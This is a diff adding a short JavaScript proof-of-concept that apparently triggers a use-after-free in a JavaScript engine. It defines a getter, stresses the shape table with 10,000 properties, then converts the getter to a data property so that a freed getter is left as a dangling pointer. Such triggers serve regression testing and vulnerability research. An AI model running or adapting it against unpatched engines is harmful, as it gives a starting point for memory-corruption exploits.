@@ -1,0 +1,24 @@
+(function() {
+    var obj = {};
+    // 1. Define a property as a getset descriptor
+    Object.defineProperty(obj, 'target', { 
+        get: function() { return 1; }, 
+        configurable: true 
+    });
+
+    // 2. Attempt to stress the shape system
+    // We create a large number of properties to force internal shape table growth
+    // and potentially trigger an allocation failure or limit in js_shape_prepare_update.
+    for (var i = 0; i < 10000; i++) {
+        obj['p' + i] = i;
+    }
+
+    // 3. Trigger the conversion from getset to data descriptor
+    // In the vulnerable version, the getter is freed BEFORE js_shape_prepare_update is called.
+    // If the update fails (due to the stress above), we get a dangling pointer.
+    Object.defineProperty(obj, 'target', { value: 2 });
+
+    // 4. Access the property to trigger the UAF
+    var x = obj.target;
+    console.log("Property value: " + x);
+})();
